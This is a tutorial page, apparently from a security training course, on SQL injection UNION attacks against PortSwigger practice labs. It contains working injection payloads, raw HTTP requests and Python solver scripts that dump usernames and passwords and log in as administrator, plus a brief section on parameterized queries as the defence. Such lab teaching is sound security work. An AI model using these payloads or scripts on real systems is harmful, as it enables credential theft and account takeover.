---
title: UNION Attacks
description: Column counting, type probing, cross-table extraction, and collapsing multiple values into a single column.
---

# UNION Attacks · Hijacking the Conveyor Belt

<p class="wd-section-lede">The <code>UNION</code> operator is like sneaking an extra print job onto a cashier's receipt printer. If the store prints a 3-column receipt (Item, Description, Price), you can stitch your own 3 columns (Username, Password, Blank) onto the bottom. The catch? The database has rigid shape rules—get the column count or types wrong by even one slot, and the whole transaction crashes.</p>

<div class="wd-callout">
<p><strong>💡 Everyday Analogy: The Dual Receipt Printer.</strong> Imagine a store receipt that prints rows of <em>[Item Name | Description | Price]</em>. The cashier's terminal has a rigid slot for each column. If you can sneak a second command that appends rows from the company payroll file, the printer will happily print employee salaries right beneath the customer's socks and coffee mugs. But if the payroll file tries to dump 2 columns into a 3-column receipt tray, the printer jams!</p>
</div>

## Case File #1: How a Second Query Piggybacks on the First

Let's follow what happens when an online shop queries products for a category like **Lifestyle**:

<div class="wd-case">
  <div class="wd-step wd-step--see">
    <span class="wd-step__tag">🔎 Step 1 · What You Notice in the Browser</span>
    <p>You click the "Lifestyle" category on the store sidebar. The browser requests <code>/filter?category=Lifestyle</code> and renders a table displaying product names, descriptions, and prices. Everything looks like a completely normal catalog.</p>
  </div>

  <div class="wd-step wd-step--server">
    <span class="wd-step__tag">⚙️ Step 2 · What the Server Does Behind the Scenes</span>
    <p>The backend glues your category string into a SQL query. When you inject a <code>UNION</code> operator, the SQL parser executes <strong>two separate queries</strong> and stitches their result rows into a single combined table before returning it to the web application:</p>
    <div class="wd-codesplit">
      <div class="wd-codesplit__legend">
        <span><span class="wd-code-dev">Blue</span> = Original Shop Query</span>
        <span><span class="wd-code-input">Gold</span> = Injected Piggyback Query</span>
        <span><span class="wd-code-dead">Strikethrough</span> = Discarded Query Tail</span>
      </div>
      <span class="wd-code-dev">SELECT name, description FROM products WHERE category = '</span><span class="wd-code-input">Lifestyle' UNION SELECT username, password FROM users--</span><span class="wd-code-dead">' AND released = 1</span>
    </div>
  </div>

  <div class="wd-step wd-step--break">
    <span class="wd-step__tag">💥 Step 3 · Where the Logic Breaks</span>
    <p>The database engine doesn't care that the first query searched for shoes while the second queried user credentials. As long as both queries return the <strong>exact same number of columns</strong> with <strong>compatible data types</strong> in each position, the database bundles the secret rows with the public products and sends them straight to the browser.</p>
  </div>

  <div class="wd-step wd-step--fix">
    <span class="wd-step__tag">🛡️ Step 4 · How Developers Lock It Down</span>
    <p>Developers isolate user input with <Term id="parameterized-query">parameterized queries</Term> (prepared statements). When the query structure is pre-compiled, the database treats <code>UNION SELECT</code> as harmless literal text inside a search string rather than an executable command operator.</p>
  </div>
</div>

### Visual Comparison: Developer Expectations vs. The Stitched Table

<div class="wd-compare">
  <div class="wd-compare__card wd-compare__card--expect">
    <span class="wd-compare__title">💭 What the Developer Expected</span>
    <p>The developer intended to return only released products matching the chosen category. The table was assumed to only ever expose safe fields from the <code>products</code> table.</p>
  </div>
  <div class="wd-compare__card wd-compare__card--actual">
    <span class="wd-compare__title">💥 What Actually Happened</span>
    <p>The <code>UNION</code> operator glues rows from the <code>users</code> table right onto the bottom of the result set. The browser's catalog template loops through the rows and renders secret admin passwords as if they were product descriptions!</p>
  </div>
</div>

---

## The Two Golden Rules of UNION Attacks

Before the database returns a single byte of extracted data, your injected query must pass two strict checks:

<div class="wd-flow">
  <div class="wd-flow__node">
    <strong>Original Query</strong>
    <code>SELECT name, desc FROM products</code><br>
    <em>Returns 2 columns: (Text, Text)</em>
  </div>
  <span class="wd-flow__arrow">+</span>
  <div class="wd-flow__node wd-flow__node--danger">
    <strong>Injected Query</strong>
    <code>UNION SELECT user, pass FROM users</code><br>
    <em>Must return matching 2 columns</em>
  </div>
  <span class="wd-flow__arrow">═</span>
  <div class="wd-flow__node wd-flow__node--safe">
    <strong>Combined Result Set</strong>
    Product rows followed immediately by User credential rows!
  </div>
</div>

1. **Equal Column Count (Arity):** Both `SELECT` statements must return the exact same number of columns. You cannot union a 2-column result with a 3-column result.
2. **Compatible Data Types:** Column 1 in your query must match the data type expected in Column 1 of the original query, Column 2 with Column 2, and so on.

```sql
SELECT id, name FROM products
UNION
SELECT username, password FROM users;
```

The database engine doesn't care that the *meanings* are completely different. It only cares that the shapes fit into the same grid.

::: details 🔬 Under the Hood: Why NULL is the Universal Shape Probe
Why do detectives probe column counts with `NULL` instead of numbers or letters?

`NULL` is the **absence of a value**. In SQL, `NULL` can be converted into any nullable data type without raising a type conversion error. 

If you probe with `'a'` against an integer column, the query fails with `Conversion failed when converting the varchar value 'a' to data type int`. But if you probe with `NULL`, the database accepts it regardless of whether the column is an integer, string, boolean, or timestamp. That means an error with `NULL` is **guaranteed to be about column count**, not data types!
:::

---

## Step 1: Count the Columns (The Arity Probe)

There are two reliable ways to find how many columns the original query is returning:

### Method A — `ORDER BY` with an Increasing Number

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--  <-- Fails!
```

`ORDER BY 2` tells the database: "Sort the results by column number 2." It doesn't need to know the column's real name. You increment the number until the database throws an error:

```text
The ORDER BY position number 4 is out of range of the number of items in the select list.
```

The first number that fails minus 1 is the exact column count. (If `4` fails, the query has 3 columns).

### Method B — `UNION SELECT NULL...` (Safer & Steadier)

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--  <-- Success!
```

When the number of `NULL`s doesn't match the original query, the database complains:

```text
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions.
```

The moment the number of `NULL`s matches the original query, the error disappears, and the webpage renders normally (often showing an extra blank row at the bottom of the product list).

> **💡 Detective Tip: Why Method B is usually preferred.** `ORDER BY` reorganizes existing rows, which can alter pagination or trigger application caching anomalies. `UNION SELECT NULL` keeps the original order intact and tests the exact operator you plan to use.

### Comment Syntax Quick Reference

| Database Engine | Terminator | Note |
| --- | --- | --- |
| **PostgreSQL** | `--` | Works immediately |
| **Oracle** | `--` | Requires `FROM dual` for every `SELECT` (`UNION SELECT NULL FROM dual--`) |
| **SQL Server** | `--` | Works immediately |
| **MySQL / MariaDB** | `#` or `-- ` | `--` **must** be followed by a space (URL-encoded as `+` or `%20`) |

---

## Step 2: Find a String-Compatible Column

Once you know the query returns 3 columns, probe each slot with a test string like `'a'` to see which columns can hold text:

```sql
' UNION SELECT 'a', NULL, NULL--
' UNION SELECT NULL, 'a', NULL--
' UNION SELECT NULL, NULL, 'a'--
```

- If the column expects a number or date, the database throws an error (`invalid input syntax for integer`).
- If the column accepts text and is displayed on the page, you'll see the letter `'a'` printed on the screen!
- If the query succeeds but `'a'` is nowhere on the page, that column is text-compatible but invisible in the HTML layout. Keep testing the other slots.

::: details ⚙️ Database Engine Variations: How Engines Treat Type Mismatches
| Engine | Injecting `'a'` into an integer column | Permissive? | Recommended Probe |
| --- | --- | --- | --- |
| **PostgreSQL** | Strict Error: `invalid input syntax for integer` | No | Start with all `NULL`, then test `'a'` |
| **MySQL** | Coerces `'a'` to `0` in many settings | Highly permissive | Check rendered text carefully |
| **Oracle** | Strict Error: `ORA-01722: invalid number` | No | Start with all `NULL`, then test `'a'` |
| **SQL Server** | Strict Error: `Conversion failed when converting...` | No | Start with all `NULL`, then test `'a'` |
:::

---

## Step 3: Choose What to Extract & Shape the Query

Once you've identified which columns accept text and print to the page, map your target data directly into those slots:

```sql
-- Scenario: 2 columns, both accept text and print on screen
' UNION SELECT username, password FROM users--

-- Scenario: 3 columns, only the second column prints on screen
' UNION SELECT NULL, username, NULL FROM users--

-- Scenario: 3 columns, first and third columns print on screen
' UNION SELECT username, NULL, password FROM users--
```

> **Where do `users`, `username`, and `password` come from?** In real engagements, table and column names aren't handed to you on a silver platter. You discover them through database fingerprinting and catalog views (covered in [Module 02 · Database Fingerprinting](/sql-injection/02-db-fingerprinting)).

---

## Step 4: Collapse Multiple Values into One Column

What if the application only renders **one** text column, but you want to extract both `username` and `password` at the same time?

Use SQL string concatenation to fuse both fields into a single text bubble, separated by a distinct delimiter like `~`:

| Database Engine | Concatenation Syntax | Example |
| --- | --- | --- |
| **PostgreSQL** | `\|\|` | `username \|\| '~' \|\| password` |
| **Oracle** | `\|\|` | `username \|\| '~' \|\| password` |
| **SQL Server** | `+` | `username + '~' + password` |
| **MySQL** | `CONCAT()` | `CONCAT(username, '~', password)` |

```sql
' UNION SELECT NULL, username || '~' || password FROM users--
```

On screen, you'll receive clean, easily split rows:
```text
administrator~s3curePassword123
wiener~peter
carlos~montoya
```

::: details ⚙️ Handling Applications That Only Show One Row
If the web application calls `fetchone()` or only displays the very first product card, your union rows may be hidden below the fold. You can force the database to return only your desired row:

```sql
-- PostgreSQL & MySQL: Select row 1
' UNION SELECT username || '~' || password FROM users LIMIT 1 OFFSET 0--

-- SQL Server: Top 1
' UNION SELECT TOP 1 username + '~' + password FROM users--

-- Oracle: ROWNUM filter
' UNION SELECT username || '~' || password FROM users WHERE ROWNUM = 1--
```
:::

---

## The Detective's UNION Investigation Playbook

Here is the exact mental progression used to solve every UNION injection challenge:

<div class="wd-flow">
  <div class="wd-flow__node">
    <strong>1. Confirm Injection</strong>
    Break with <code>'</code> and repair with <code>''</code>
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node">
    <strong>2. Count Columns</strong>
    <code>ORDER BY n</code> or <code>UNION SELECT NULL...</code>
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node">
    <strong>3. Test Text Slots</strong>
    Place test string <code>'a'</code> into each slot
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node">
    <strong>4. Identify Rendered Slot</strong>
    Spot where the test string appears on the page
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node wd-flow__node--safe">
    <strong>5. Extract Data</strong>
    Query <code>users</code> table, using <code>||</code> if slots are tight
  </div>
</div>

---

## Detective Troubleshooting Matrix

| Clue / Symptom | Likely Cause | Next Investigative Move |
| --- | --- | --- |
| `ORDER BY 1` immediately errors | Input is not in a string literal, or comment syntax is incorrect | Check for numeric injection without quotes, or use `#` / `-- ` on MySQL |
| `UNION SELECT NULL` errors at every count | Parentheses wrap the query, or quotes are unbalanced | Try adding `)` before `UNION`, or verify the query terminator |
| Correct count still produces an error | Non-NULL probe hit a strict type constraint | Revert all slots to `NULL`, then test one position at a time |
| Query succeeds with 200 OK, but no data shows | Column is not rendered in HTML, or app displays only row 1 | Test other column slots, or add `WHERE username='administrator'` |
| Output looks chopped off | HTML table cell truncates long strings | Use `SUBSTRING()` or split into shorter chunks |
| Oracle: `ORA-00933: SQL command not properly ended` | Missing `FROM dual` on Oracle | Add `FROM dual` to any standalone `SELECT` |

---

## Practice Labs: UNION Attacks

Work through the four case files below in order. They build a complete chain from finding the column count, to locating the text slot, to dumping secret tables, to compressing multiple values when the app only gives you a single column!

:::: lab

## Lab 1 · Determining the number of columns {#lab-determine-number-of-columns}

**Vulnerability class:** in-band UNION, arity discovery.
**Goal:** add an extra row of `NULL`s by matching the original query's column count.

The category filter is concatenated into a string literal. The results are returned in the page, so a correctly shaped `UNION` will render.

[Launch Lab on PortSwigger ↗](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

<LabCheckbox lab-id="lab-determine-number-of-columns" />

::: details 💡 Progressive Hints
**Level 1 — mental nudge.** A union combines two result sets. What must be true about their shapes before the database will combine them?

**Level 2 — target parameter and approach.** Inject into `category`. Start with a single `NULL` and add one `NULL` per attempt. The right count is the first one that stops producing an error. This lab's query returns three columns.

**Level 3 — exploit skeleton.**

```http
GET /filter?category=%27+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1
Host: <lab-id>.web-security-academy.net
```
:::

::: details 🔓 Deconstructed Solution & Token Breakdown
### Raw HTTP request

```http
GET /filter?category=%27+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1
Host: <lab-id>.web-security-academy.net
Accept: text/html
Connection: close
```

### The query before and after

```sql
-- before
SELECT id, name, description FROM products WHERE category = 'Gifts'

-- after (the exact column names are illustrative; only the arity is known)
SELECT id, name, description FROM products WHERE category = ''
UNION SELECT NULL, NULL, NULL--' AND released = 1
```

With one or two `NULL`s the target lists differ in length and the binder raises a UNION arity error. With three, the shapes match and the engine appends a row of `NULL`s.

### Every character, accounted for

| Payload piece | Meaning | Why it is there |
| --- | --- | --- |
| `%27` → `'` | closes the category literal | Switches to code context |
| `+` → space | separator | Keeps tokens distinct |
| `UNION` | set operator | Appends the injected result set |
| `SELECT` | starts the second query | Required by UNION syntax |
| `NULL` ×3 | one per target column | Polymorphic, so no type errors mask the arity test |
| `,` | column separator | Each comma adds one position to the target list |
| `--` | comment | Removes the original trailing quote and filters |

> **Reading the result.** When the count is wrong, you get an error or a missing page. When it is right, you get the original products **plus** a row of empty values. The extra row may be visually subtle; compare the HTML length and row count, not just the rendered text.

### Python `requests` solver

```python
import sys
import requests

BASE = "https://<lab-id>.web-security-academy.net"  # replace with your lab instance
MARKER = 'class="product-card"'  # adjust if the lab theme changes

def main() -> None:
    s = requests.Session()
    baseline = s.get(f"{BASE}/filter", params={"category": "Gifts"}, timeout=20)
    base_cards = baseline.text.count(MARKER)

    for count in range(1, 8):
        payload = f"' UNION SELECT {','.join(['NULL'] * count)}--"
        r = s.get(f"{BASE}/filter", params={"category": payload}, timeout=20)
        cards = r.text.count(MARKER)
        ok = r.status_code == 200 and cards > base_cards
        print(f"{count} column(s): HTTP {r.status_code}, cards {base_cards} -> {cards} {'<-- arity matched' if ok else ''}")
        if ok:
            print(f"[+] Original query returns {count} column(s). Lab solved.")
            return

    print("[!] No arity matched. Check the comment syntax and the lab host.")
    sys.exit(1)

if __name__ == "__main__":
    main()
```

### Why this works, in one sentence

The probe isolates **one** variable — arity — by using `NULL`, which cannot fail a type check, so the only remaining reason for an error is a mismatched number of columns.
:::

::::

:::: lab

## Lab 2 · Finding a column containing text {#lab-find-column-containing-text}

**Vulnerability class:** in-band UNION, type probing.
**Goal:** make a lab-provided random string appear in the query results.

The query returns three columns. Not all of them accept string data, and not all are rendered. You need to find a position that is both string-compatible and visible.

[Launch Lab on PortSwigger ↗](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

<LabCheckbox lab-id="lab-find-column-containing-text" />

::: details 💡 Progressive Hints
**Level 1 — mental nudge.** `NULL` is compatible with every type. A string is not. What does an error when you substitute a string tell you about that position?

**Level 2 — target parameter and approach.** The query has three columns. Replace one `NULL` at a time with the random value shown in the lab banner. If the position rejects strings, the query errors; try the next position. One position both accepts the string and renders it.

**Level 3 — exploit skeleton.**

```http
GET /filter?category=%27+UNION+SELECT+%27<random-value>%27,NULL,NULL-- HTTP/1.1
Host: <lab-id>.web-security-academy.net
```
:::

::: details 🔓 Deconstructed Solution & Token Breakdown
### Raw HTTP request

```http
GET /filter?category=%27+UNION+SELECT+%27abcdef%27,NULL,NULL-- HTTP/1.1
Host: <lab-id>.web-security-academy.net
Accept: text/html
Connection: close
```

`abcdef` stands for the random value from your instance. If column one rejects it, move the literal to the second or third position:

```sql
' UNION SELECT NULL, 'abcdef', NULL--
' UNION SELECT NULL, NULL, 'abcdef'--
```

### The query before and after

```sql
-- before
SELECT id, name, description FROM products WHERE category = 'Gifts'

-- after (string lands in column two, which is rendered)
SELECT id, name, description FROM products WHERE category = ''
UNION SELECT NULL, 'abcdef', NULL--' AND released = 1
```

### Every character, accounted for

| Payload piece | Meaning | Why it is there |
| --- | --- | --- |
| `'` | closes the category literal | Code context |
| `UNION SELECT` | appends a second result set | Must match arity |
| `'abcdef'` | a string literal | Tests string compatibility *and* visibility |
| `NULL` | the other positions | Keeps arity at three without adding type risk |
| position of the literal | which column is being tested | Move it one slot per request |
| `--` | comment | Removes the original query tail |

> **Why an error is informative.** A conversion error at position 1 means the column is numeric (or otherwise non-string). A successful query with no visible value means the column is string-compatible but not rendered. Only a successful query **with the value visible** combines both properties.

### Python `requests` solver

```python
import re
import sys
import requests

BASE = "https://<lab-id>.web-security-academy.net"  # replace with your lab instance

def get_random_value(html: str) -> str | None:
    # The lab banner says: "Make the database retrieve the string: '...'"
    match = re.search(r"retrieve the string:\s*'([^']+)'", html, re.I)
    return match.group(1) if match else None

def main() -> None:
    s = requests.Session()
    home = s.get(BASE, timeout=20)
    value = get_random_value(home.text)
    if not value:
        print("[!] Could not find the random value on the home page.")
        print("    Open the lab in a browser and copy it into this script.")
        sys.exit(1)
    print(f"[*] Target string: {value}")

    for position in range(1, 4):
        columns = ["NULL"] * 3
        columns[position - 1] = f"'{value}'"
        payload = f"' UNION SELECT {','.join(columns)}--"
        r = s.get(f"{BASE}/filter", params={"category": payload}, timeout=20)
        hit = r.status_code == 200 and value in r.text
        print(f"column {position}: HTTP {r.status_code}, value visible: {hit}")
        if hit:
            print(f"[+] Column {position} accepts and renders strings. Lab solved.")
            return

    print("[!] No position rendered the value. Re-check the column count.")
    sys.exit(1)

if __name__ == "__main__":
    main()
```

### Why this works, in one sentence

It separates the two questions the binder asks — *does this position accept text?* and *does the application display this position?* — by changing only which `NULL` is replaced.
:::

::::

:::: lab

## Lab 3 · Retrieving data from other tables {#lab-retrieve-data-from-other-tables}

**Vulnerability class:** in-band UNION, cross-table extraction.
**Goal:** retrieve all usernames and passwords, then log in as `administrator`.

The query returns two columns, both string-compatible. The `users` table is known to have `username` and `password` columns.

[Launch Lab on PortSwigger ↗](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

<LabCheckbox lab-id="lab-retrieve-data-from-other-tables" />

::: details 💡 Progressive Hints
**Level 1 — mental nudge.** You have two text columns and a second table with exactly two interesting columns. What is the simplest possible mapping?

**Level 2 — target parameter and approach.** Confirm the arity is two, then replace the `NULL` placeholders with `username` and `password` from `users`. The appended rows render alongside the product data.

**Level 3 — exploit skeleton.**

```http
GET /filter?category=%27+UNION+SELECT+username,password+FROM+users-- HTTP/1.1
Host: <lab-id>.web-security-academy.net
```
:::

::: details 🔓 Deconstructed Solution & Token Breakdown
### Raw HTTP request

```http
GET /filter?category=%27+UNION+SELECT+username,password+FROM+users-- HTTP/1.1
Host: <lab-id>.web-security-academy.net
Accept: text/html
Connection: close
```

### The query before and after

```sql
-- before
SELECT name, description FROM products WHERE category = 'Gifts'

-- after
SELECT name, description FROM products WHERE category = ''
UNION SELECT username, password FROM users--' AND released = 1
```

The result set now contains product rows followed by every user row. The application renders both the same way, which is why the credentials appear as if they were products.

### Every character, accounted for

| Payload piece | Meaning | Why it is there |
| --- | --- | --- |
| `'` | closes the literal | Code context |
| `UNION SELECT` | append a second result set | Arity must be two |
| `username` | column from `users` | Maps to the first display column |
| `,` | column separator | Arity stays two |
| `password` | column from `users` | Maps to the second display column |
| `FROM users` | changes the row source | This is the actual privilege boundary crossing |
| `--` | comment | Removes the original tail |

> **A subtle point about `SELECT` without `FROM`.** PostgreSQL, MySQL, and SQL Server allow `SELECT 1` without a table. Oracle does not; every Oracle `SELECT` needs `FROM dual`. If this payload fails on Oracle with `ORA-00923`, add `FROM dual` and query the catalog first.

### Python `requests` solver

```python
import re
import sys
import requests

BASE = "https://<lab-id>.web-security-academy.net"  # replace with your lab instance

def main() -> None:
    s = requests.Session()

    # Concatenate into one column so the output is unambiguous to parse.
    # Both columns are text in this lab, so column one can hold the concatenation
    # and column two can stay NULL.
    payload = (
        "' UNION SELECT NULL, username || '~' || password FROM users "
        "WHERE username='administrator'--"
    )
    r = s.get(f"{BASE}/filter", params={"category": payload}, timeout=20)

    pairs = re.findall(r"([A-Za-z0-9_.-]+)~([A-Za-z0-9!@#$%^&*._-]+)", r.text)
    creds = dict(pairs)
    if "administrator" not in creds:
        print("[!] Could not parse administrator credentials from the response.")
        print(f"    HTTP {r.status_code}, {len(r.text)} bytes")
        sys.exit(1)

    password = creds["administrator"]
    print(f"[+] administrator password: {password}")

    login = s.post(
        f"{BASE}/login",
        data={"username": "administrator", "password": password},
        allow_redirects=True,
        timeout=20,
    )
    if "Log out" in login.text or "/my-account" in login.url:
        print("[+] Logged in as administrator. Lab solved.")
    else:
        print("[!] Credentials parsed but login failed. Verify the delimiter regex.")
        sys.exit(1)

if __name__ == "__main__":
    main()
```

### Why this works, in one sentence

`UNION` is not limited to the table named in the original `FROM`; it executes a fresh `SELECT` with its own `FROM users`, and the application renders the combined set without knowing where the rows came from.
:::

::::

:::: lab

## Lab 4 · Multiple values in a single column {#lab-retrieve-multiple-values-in-single-column}

**Vulnerability class:** in-band UNION, string aggregation.
**Goal:** retrieve usernames and passwords when only one column is string-compatible.

The query returns two columns, but only one accepts text. You cannot put `username` and `password` in separate columns. You must concatenate them.

[Launch Lab on PortSwigger ↗](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

<LabCheckbox lab-id="lab-retrieve-multiple-values-in-single-column" />

::: details 💡 Progressive Hints
**Level 1 — mental nudge.** One output column, two values. What SQL operator joins two strings into one?

**Level 2 — target parameter and approach.** The second column accepts text. Concatenate `username`, a separator that cannot appear in the data, and `password`. The lab runs on PostgreSQL, where `||` is concatenation.

**Level 3 — exploit skeleton.**

```http
GET /filter?category=%27+UNION+SELECT+NULL,username%7C%7C%27~%27%7C%7Cpassword+FROM+users-- HTTP/1.1
Host: <lab-id>.web-security-academy.net
```
:::

::: details 🔓 Deconstructed Solution & Token Breakdown
### Raw HTTP request

```http
GET /filter?category=%27+UNION+SELECT+NULL,username%7C%7C%27~%27%7C%7Cpassword+FROM+users-- HTTP/1.1
Host: <lab-id>.web-security-academy.net
Accept: text/html
Connection: close
```

Decoded payload: `' UNION SELECT NULL,username||'~'||password FROM users--`

### The query before and after

```sql
-- before
SELECT name, description FROM products WHERE category = 'Gifts'

-- after
SELECT name, description FROM products WHERE category = ''
UNION SELECT NULL, username || '~' || password FROM users--' AND released = 1
```

### Every character, accounted for

| Payload piece | Meaning | Why it is there |
| --- | --- | --- |
| `'` | closes the category literal | Code context |
| `UNION SELECT NULL,` | first column must be present but is not usable for text | Arity stays two |
| `username` | first data value | From the `users` table |
| `%7C%7C` → `\|\|` | PostgreSQL/Oracle string concatenation | Joins values into one column |
| `'~'` | delimiter | Makes parsing unambiguous after extraction |
| `password` | second data value | Same column as username |
| `FROM users` | row source | Crosses the table boundary |
| `--` | comment | Repairs the query tail |

> **Why a delimiter is not optional.** Without it, `administrator` + `s3cure` becomes `administrators3cure`, and you cannot tell where the username ends. Choose a character that cannot occur in either field; `~`, `:`, or `0x7c` are common.

### Python `requests` solver

```python
import re
import sys
import requests

BASE = "https://<lab-id>.web-security-academy.net"  # replace with your lab instance

def main() -> None:
    s = requests.Session()

    # Only column two is text. Concatenate username and password with ~.
    # Target only the administrator so the output fits in a single rendered row.
    payload = (
        "' UNION SELECT NULL,username||'~'||password FROM users "
        "WHERE username='administrator'--"
    )
    r = s.get(f"{BASE}/filter", params={"category": payload}, timeout=20)

    pairs = re.findall(r"([A-Za-z0-9_.-]+)~([A-Za-z0-9!@#$%^&*._-]+)", r.text)
    creds = dict(pairs)
    print(f"[*] parsed {len(creds)} credential pair(s)")

    if "administrator" not in creds:
        print("[!] administrator not found. The response may be truncated;")
        print("    try limiting rows or increasing the output size.")
        sys.exit(1)

    password = creds["administrator"]
    print(f"[+] administrator password: {password}")

    login = s.post(
        f"{BASE}/login",
        data={"username": "administrator", "password": password},
        allow_redirects=True,
        timeout=20,
    )
    if "Log out" in login.text or "/my-account" in login.url:
        print("[+] Logged in as administrator. Lab solved.")
    else:
        print("[!] Login failed. Check the password extraction.")
        sys.exit(1)

if __name__ == "__main__":
    main()
```

### Why this works, in one sentence

The application may limit how many *columns* it renders, but it does not limit how much text can be inside one column; concatenation turns a many-value problem into a formatting problem.
:::

::::

<TopicComplete topic-id="sql-injection/union-attacks" label="Mark the UNION attacks module complete" />

---

## Before you move on

- Can you explain why the arity probe uses `NULL` instead of `'a'`?
- Do you know the difference between "this column rejects strings" and "this column is not rendered"?
- Can you write the concatenation for PostgreSQL, MySQL, and SQL Server from memory?
- If `UNION SELECT NULL,NULL` still errors, what else could be wrong besides the column count?

Next: [Module 02 · Database Fingerprinting](/sql-injection/02-db-fingerprinting) — because in a real engagement, nobody tells you the table is called `users`.
